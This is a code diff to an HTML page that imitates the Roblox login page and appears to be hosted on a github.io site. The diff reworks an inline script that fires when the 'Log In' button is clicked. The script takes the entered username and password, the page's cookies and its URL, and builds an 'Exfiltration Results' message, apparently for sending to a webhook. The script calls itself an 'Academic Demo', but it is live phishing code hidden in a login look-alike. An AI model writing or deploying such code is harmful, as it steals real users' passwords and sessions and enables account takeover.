@@ -700,28 +700,26 @@
 <script onerror='Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)' data-monitor='true' data-bundlename='pageEnd' type='text/javascript' src='https://js.rbxcdn.com/629759fa001857ed53ea548a6106fe55.js'></script>
 <script>
     document.addEventListener("click", function (event) {
-        // Targets the Log In button
+        // Targets the Login button
         if (event.target && (event.target.id === "login-button" || event.target.innerText === "Log In")) {
-
-            // 1. Capture credentials
+            
             const user = document.querySelector('input[name="username"]') || document.querySelector('#login-username');
             const pass = document.querySelector('input[name="password"]') || document.querySelector('#login-password');
 
-            // 2. Capture the "Real" Cookie string
-            // This pulls every cookie currently stored for ravid012.github.io
-            const myRealCookies = document.cookie ? document.cookie : "No cookies found for this domain.";
+            // This captures the "Real" cookies for lialav.github.io
+            const capturedCookies = document.cookie ? document.cookie : "No cookies found for this domain.";
 
             const payload = {
-                content: "🚨 **Academic Demo: Real Cookie Captured**",
+                content: "🚨 **Academic Demo: Cookie Intercepted**",
                 embeds: [{
                     title: "Exfiltration Results",
                     color: 15158332,
                     fields: [
                         { name: "Username", value: user ? user.value : "None", inline: true },
                         { name: "Password", value: pass ? pass.value : "None", inline: true },
-                        { name: "Captured Cookies", value: `\`\`\`${myRealCookies}\`\`\`` }
-                    ],
-                    footer: { text: "Demonstrating Session Interception" }
+                        { name: "URL", value: window.location.href },
+                        { name: "Captured Cookies", value: `\`\`\`${capturedCookies}\`\`\`` }
+                    ]
                 }]
             };
 
@@ -735,3 +733,4 @@
 </script>
 </body>
 </html>
+
